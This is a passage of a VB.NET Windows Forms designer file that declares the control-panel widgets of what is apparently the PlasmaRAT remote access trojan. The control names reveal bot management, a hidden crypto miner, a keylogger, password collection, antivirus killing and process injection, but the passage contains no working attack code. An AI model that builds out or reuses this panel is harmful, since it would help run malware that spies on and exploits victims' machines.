    Friend WithEvents PORTBuild As System.Windows.Forms.TextBox
    Friend WithEvents Label12 As System.Windows.Forms.Label
    Friend WithEvents TabPage8 As System.Windows.Forms.TabPage
    Friend WithEvents GroupBox9 As System.Windows.Forms.GroupBox
    Friend WithEvents Button14 As System.Windows.Forms.Button
    Friend WithEvents Button15 As System.Windows.Forms.Button
    Friend WithEvents SendMinerOnConnect As System.Windows.Forms.CheckBox
    Friend WithEvents TextBox7 As System.Windows.Forms.TextBox
    Friend WithEvents MinerPass As System.Windows.Forms.TextBox
    Friend WithEvents MinerUser As System.Windows.Forms.TextBox
    Friend WithEvents Label16 As System.Windows.Forms.Label
    Friend WithEvents Label15 As System.Windows.Forms.Label
    Friend WithEvents MinerPool As System.Windows.Forms.TextBox
    Friend WithEvents Label14 As System.Windows.Forms.Label
    Friend WithEvents GroupBox10 As System.Windows.Forms.GroupBox
    Friend WithEvents MinerFiles As System.Windows.Forms.TextBox
    Friend WithEvents Label17 As System.Windows.Forms.Label
    Friend WithEvents Button16 As System.Windows.Forms.Button
    Friend WithEvents BotLogsRightClick As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents ToolStripMenuItem5 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripMenuItem6 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents PasswordRightClick As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents ToolStripMenuItem8 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripMenuItem10 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripSeparator4 As System.Windows.Forms.ToolStripSeparator
    Friend WithEvents ToolStripMenuItem9 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripSeparator5 As System.Windows.Forms.ToolStripSeparator
    Friend WithEvents ToolStripMenuItem11 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripMenuItem12 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripSeparator6 As System.Windows.Forms.ToolStripSeparator
    Friend WithEvents ToolStripMenuItem13 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripMenuItem14 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents GroupBox11 As System.Windows.Forms.GroupBox
    Friend WithEvents Folder As System.Windows.Forms.TextBox
    Friend WithEvents Label19 As System.Windows.Forms.Label
    Friend WithEvents Label18 As System.Windows.Forms.Label
    Friend WithEvents FileName As System.Windows.Forms.TextBox
    Friend WithEvents ToolStripMenuItem4 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripMenuItem7 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripSeparator2 As System.Windows.Forms.ToolStripSeparator
    Friend WithEvents EnableInstallation As System.Windows.Forms.CheckBox
    Friend WithEvents RunHardBotKillerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents InjectFileRunPEToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents InjectFileReflectionToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents StopMiningToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripSeparator7 As System.Windows.Forms.ToolStripSeparator
    Friend WithEvents ToolStripSeparator8 As System.Windows.Forms.ToolStripSeparator
    Friend WithEvents ToolStripMenuItem15 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripSeparator9 As System.Windows.Forms.ToolStripSeparator
    Friend WithEvents ToolStripSeparator10 As System.Windows.Forms.ToolStripSeparator
    Friend WithEvents ToolStripMenuItem16 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents SeedTorrentToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents Keylogger As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DownloadKeylogsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents SearchKeylogsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DeleteKeylogsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents BotListView As PlasmaRAT.AeroListView
    Friend WithEvents LogView As PlasmaRAT.AeroListView
    Friend WithEvents PasswordListView As PlasmaRAT.AeroListView
    Friend WithEvents CommandsListView As PlasmaRAT.AeroListView
    Friend WithEvents GroupBox7 As System.Windows.Forms.GroupBox
    Friend WithEvents ToolTip1 As System.Windows.Forms.ToolTip
    Friend WithEvents BotResourceProtection As System.Windows.Forms.CheckBox
    Friend WithEvents AVKiller As System.Windows.Forms.CheckBox
    Friend WithEvents SWIP As System.Windows.Forms.CheckBox
    Friend WithEvents SetKernelObjectSecurity As System.Windows.Forms.CheckBox
    Friend WithEvents SetProcessCritical As System.Windows.Forms.CheckBox
    Friend WithEvents AutomaticBK As System.Windows.Forms.CheckBox
    Friend WithEvents Label20 As System.Windows.Forms.Label
    Friend WithEvents Button8 As System.Windows.Forms.Button
    Friend WithEvents Button6 As System.Windows.Forms.Button
    Friend WithEvents GlobalMessage As System.Windows.Forms.TextBox
    Friend WithEvents GPUMiner As System.Windows.Forms.RadioButton
    Friend WithEvents CPUMiner As System.Windows.Forms.RadioButton
    Friend WithEvents GroupBox8 As System.Windows.Forms.GroupBox
    Friend WithEvents Button12 As System.Windows.Forms.Button
    Friend WithEvents Button11 As System.Windows.Forms.Button
    Friend WithEvents Button10 As System.Windows.Forms.Button
    Friend WithEvents Button9 As System.Windows.Forms.Button
    Friend WithEvents Button19 As System.Windows.Forms.Button
    Friend WithEvents Button18 As System.Windows.Forms.Button
    Friend WithEvents Button17 As System.Windows.Forms.Button
    Friend WithEvents Label22 As System.Windows.Forms.Label
    Friend WithEvents Label21 As System.Windows.Forms.Label
    Friend WithEvents GroupBox12 As System.Windows.Forms.GroupBox
    Friend WithEvents Label23 As System.Windows.Forms.Label
    Friend WithEvents ClientOnError As System.Windows.Forms.CheckBox
    Friend WithEvents SingleConnection As System.Windows.Forms.CheckBox
    Friend WithEvents StatusStrip1 As System.Windows.Forms.StatusStrip
    Friend WithEvents BotsOnline As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents BotPeak As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents SelectedBots As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents StartListening As System.Windows.Forms.ToolStripSplitButton
    Friend WithEvents ToolStripStatusLabel3 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents ConnectionHelpToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents PortForwardingTestToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents PingPong As System.Windows.Forms.CheckBox
    Friend WithEvents Button4 As System.Windows.Forms.Button
    Friend WithEvents LowBandwidth As System.Windows.Forms.CheckBox
    Friend WithEvents GroupBox13 As System.Windows.Forms.GroupBox
    Friend WithEvents EnableBackupDNS As System.Windows.Forms.CheckBox
    Friend WithEvents TestBackupDNS As System.Windows.Forms.Button
    Friend WithEvents BackupDNS As System.Windows.Forms.TextBox

End Class
